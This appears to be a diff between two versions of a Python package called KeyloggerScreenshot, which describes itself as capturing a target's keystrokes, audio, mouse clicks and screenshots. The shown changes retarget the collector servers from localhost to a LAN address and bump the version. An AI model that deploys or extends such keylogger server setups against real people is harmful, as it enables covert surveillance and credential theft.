### Comparing `KeyloggerScreenshot-0.4.2/README.md` & `KeyloggerScreenshot-0.4.3/README.md`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/demon_server.py` & `KeyloggerScreenshot-0.4.3/demon_server.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,12 +1,11 @@
 import KeyloggerScreenshot as ks
 import threading
 
-ip = "127.0.0.1"
-
+ip = "192.168.0.70"
 server_photos = ks.ServerPhotos(ip, 1111)
 
 server_keylogger = ks.ServerKeylogger(ip, 2222, simulater=True)
 
 server_listener = ks.ServerListener(ip, 3333)
 
 server_time = ks.Timer(ip, 4444)
```

### Comparing `KeyloggerScreenshot-0.4.2/leo_gui.py` & `KeyloggerScreenshot-0.4.3/leo_gui.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/requirements.py` & `KeyloggerScreenshot-0.4.3/requirements.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.2/setup.py` & `KeyloggerScreenshot-0.4.3/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -6,15 +6,15 @@
     'Operating System :: Microsoft :: Windows :: Windows 10',
     'License :: OSI Approved :: MIT License',
     'Programming Language :: Python :: 3'
 ]
 
 setup(
     name='KeyloggerScreenshot',
-    version='0.4.2',
+    version='0.4.3',
     description='Exporting Keylogger files, recording audio, recording mouse click information and screenshots of the target. For more information check out my website:https://pypi.org/project/KeyloggerScreenshot/ and my github: https://github.com/Facileee/KeyloggerScreenshot',
     long_description_content_type="text/markdown",
     long_description=open('README.md').read() + '\n\n' + open('CHANGELOG.txt').read(),
     url='',
     author='Fawaz Bashiru',
     author_email='fawazbashiru@gmail.com',
     license='MIT',
```

